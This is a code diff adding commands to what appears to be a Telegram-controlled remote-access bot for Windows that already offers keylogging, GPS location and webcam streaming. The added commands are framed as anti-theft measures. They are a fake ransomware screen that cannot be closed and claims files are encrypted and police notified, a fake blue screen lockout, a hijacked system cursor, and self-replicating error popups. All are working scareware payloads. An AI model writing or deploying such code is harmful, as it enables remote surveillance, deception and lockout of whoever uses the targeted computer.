@@ -141,6 +141,11 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/stream [on/off] - Live HD Video Stream (Local WiFi) 🎥\n"
             "/location - Pinpoint Hardware GPS location 📍\n"
             "/jiggle - Anti-sleep WakeLock 🖱️\n\n"
+            "☠️ **Psychological Warfare**\n"
+            "/ransom [on/off] - Fake Ransomware Fullscreen\n"
+            "/bsod [on/off] - Fake Blue Screen of Death\n"
+            "/loading [on/off] - Endless Windows Loading Cursor\n"
+            "/hydra [on/off] - Replicating Error Popups\n\n"
             "📁 **Files & Media**\n"
             "*(Send YouTube/Twitter links to auto-download MP4s!)*\n"
             "/ls & /cd [dir] - Interactive file explorer 📂\n"
@@ -727,6 +732,184 @@ async def keylog_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text("📜 Keylog stopped. No keys were pressed.")
 
+# --- PSYCHOLOGICAL WARFARE COMMANDS ---
+
+async def ransom_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_auth(update): return
+    command = "on" if not context.args else context.args[0].lower()
+    
+    ransom_path = os.path.join(TEMP_DIR, "ransom.py")
+    if command == "on":
+        code = '''
+import tkinter as tk
+import time
+
+def keep_on_top():
+    root.lift()
+    root.attributes('-topmost', True)
+    root.after(100, keep_on_top)
+
+root = tk.Tk()
+root.attributes('-fullscreen', True)
+root.configure(bg='black')
+root.attributes('-topmost', True)
+root.protocol("WM_DELETE_WINDOW", lambda: None) # Disable closing
+root.overrideredirect(True) # Remove window borders
+
+tk.Label(root, text="ALL YOUR FILES HAVE BEEN ENCRYPTED.", font=("Courier", 40, "bold"), fg="red", bg="black").pack(pady=100)
+tk.Label(root, text="Smile for the camera.", font=("Courier", 30), fg="white", bg="black").pack(pady=20)
+tk.Label(root, text="The police have been notified with your photo and GPS location.", font=("Courier", 20), fg="white", bg="black").pack(pady=50)
+tk.Label(root, text="DO NOT TURN OFF THIS COMPUTER.", font=("Courier", 25, "bold"), fg="red", bg="black").pack(pady=100)
+
+keep_on_top()
+root.mainloop()
+'''
+        with open(ransom_path, "w") as f:
+            f.write(code)
+        
+        subprocess.Popen(["python", ransom_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        await update.message.reply_text("☠️ Fake Ransomware Screen is ON. The thief is locked out.")
+    
+    elif command == "off":
+        subprocess.call(["taskkill", "/F", "/IM", "python.exe", "/FI", f"WINDOWTITLE eq ransom.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+        # Fallback to kill all python scripts named ransom.py using wmic
+        subprocess.call('wmic process where "commandline like \'%ransom.py%\'" delete', shell=True)
+        if os.path.exists(ransom_path): os.remove(ransom_path)
+        await update.message.reply_text("☠️ Ransomware Screen OFF.")
+
+async def bsod_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_auth(update): return
+    command = "on" if not context.args else context.args[0].lower()
+    
+    bsod_path = os.path.join(TEMP_DIR, "bsod.py")
+    if command == "on":
+        code = '''
+import tkinter as tk
+
+root = tk.Tk()
+root.attributes('-fullscreen', True)
+root.configure(bg='#0078D7') # Windows BSOD Blue
+root.attributes('-topmost', True)
+root.protocol("WM_DELETE_WINDOW", lambda: None)
+root.overrideredirect(True)
+
+tk.Label(root, text=":(", font=("Segoe UI", 120), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=100, y=100)
+tk.Label(root, text="Your PC ran into a problem and needs to restart.", font=("Segoe UI", 30), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=120, y=320)
+tk.Label(root, text="We're just collecting some error info, and then we'll restart for you.", font=("Segoe UI", 30), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=120, y=380)
+
+tk.Label(root, text="20% complete", font=("Segoe UI", 30), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=120, y=480)
+
+tk.Label(root, text="For more information about this issue and possible fixes, visit https://www.windows.com/stopcode", font=("Segoe UI", 15), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=250, y=620)
+tk.Label(root, text="If you call a support person, give them this info:", font=("Segoe UI", 13), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=250, y=650)
+tk.Label(root, text="Stop code: UNAUTHORIZED_THIEF_DETECTED", font=("Segoe UI", 13, "bold"), fg="white", bg='#0078D7', anchor="w", justify="left").place(x=250, y=675)
+
+root.mainloop()
+'''
+        with open(bsod_path, "w") as f:
+            f.write(code)
+        
+        subprocess.Popen(["python", bsod_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        await update.message.reply_text("💀 Fake BSOD is ON. The thief thinks the PC crashed.")
+    
+    elif command == "off":
+        subprocess.call('wmic process where "commandline like \'%bsod.py%\'" delete', shell=True)
+        if os.path.exists(bsod_path): os.remove(bsod_path)
+        await update.message.reply_text("💀 BSOD OFF.")
+
+async def loading_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_auth(update): return
+    command = "on" if not context.args else context.args[0].lower()
+    
+    if command == "on":
+        code = '''
+import ctypes
+import time
+import sys
+
+# Windows API Constants
+OCR_NORMAL = 32512
+OCR_WAIT = 32514
+SPI_SETCURSORS = 0x0057
+
+try:
+    # Load the wait cursor
+    wait_cursor = ctypes.windll.user32.LoadCursorW(0, OCR_WAIT)
+    # Set the normal arrow cursor to look like the wait cursor
+    ctypes.windll.user32.SetSystemCursor(wait_cursor, OCR_NORMAL)
+except Exception as e:
+    sys.exit(1)
+'''
+        loading_path = os.path.join(TEMP_DIR, "loading.py")
+        with open(loading_path, "w") as f: f.write(code)
+        subprocess.Popen(["python", loading_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        await update.message.reply_text("⏳ Endless Loading Wheel ON. The mouse is stuck loading.")
+    
+    elif command == "off":
+        # Restore system cursors via Windows API
+        code = '''
+import ctypes
+SPI_SETCURSORS = 0x0057
+ctypes.windll.user32.SystemParametersInfoW(SPI_SETCURSORS, 0, 0, 0)
+'''
+        loading_off_path = os.path.join(TEMP_DIR, "loading_off.py")
+        with open(loading_off_path, "w") as f: f.write(code)
+        subprocess.Popen(["python", loading_off_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        await update.message.reply_text("⏳ Normal mouse restored.")
+
+async def hydra_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_auth(update): return
+    command = "on" if not context.args else context.args[0].lower()
+    
+    hydra_path = os.path.join(TEMP_DIR, "hydra.py")
+    if command == "on":
+        code = '''
+import tkinter as tk
+from tkinter import messagebox
+import subprocess
+import sys
+import random
+import os
+
+def spawn_more():
+    script_path = os.path.abspath(sys.argv[0])
+    subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NO_WINDOW)
+    root.destroy()
+
+root = tk.Tk()
+root.withdraw() # Hide main window
+
+# Randomize spawn location on screen
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+x = random.randint(0, screen_width - 300)
+y = random.randint(0, screen_height - 150)
+root.geometry(f"+{x}+{y}")
+
+# Create custom popup so we can catch the close event
+popup = tk.Toplevel(root)
+popup.title("System Error")
+popup.geometry(f"300x120+{x}+{y}")
+popup.protocol("WM_DELETE_WINDOW", spawn_more)
+popup.attributes('-topmost', True)
+
+tk.Label(popup, text="CRITICAL ERROR: BRAIN NOT FOUND", font=("Arial", 10, "bold")).pack(pady=20)
+tk.Button(popup, text="OK", command=spawn_more, width=10).pack(pady=10)
+
+root.mainloop()
+'''
+        with open(hydra_path, "w") as f:
+            f.write(code)
+        
+        subprocess.Popen(["python", hydra_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        await update.message.reply_text("🐉 Hydra Pop-ups unleashed! Closing one spawns two more.")
+    
+    elif command == "off":
+        subprocess.call('wmic process where "commandline like \'%hydra.py%\'" delete', shell=True)
+        if os.path.exists(hydra_path): os.remove(hydra_path)
+        await update.message.reply_text("🐉 Hydra slayed. All pop-ups destroyed.")
+
+
 async def ls_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_auth(update): return
     global current_dir
@@ -1023,6 +1206,10 @@ def main():
     app.add_handler(CommandHandler("ls", ls_cmd))
     app.add_handler(CommandHandler("cd", cd_cmd))
     app.add_handler(CommandHandler("bluetooth", bluetooth_cmd))
+    app.add_handler(CommandHandler("ransom", ransom_cmd))
+    app.add_handler(CommandHandler("bsod", bsod_cmd))
+    app.add_handler(CommandHandler("loading", loading_cmd))
+    app.add_handler(CommandHandler("hydra", hydra_cmd))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))
     
     app.run_polling()
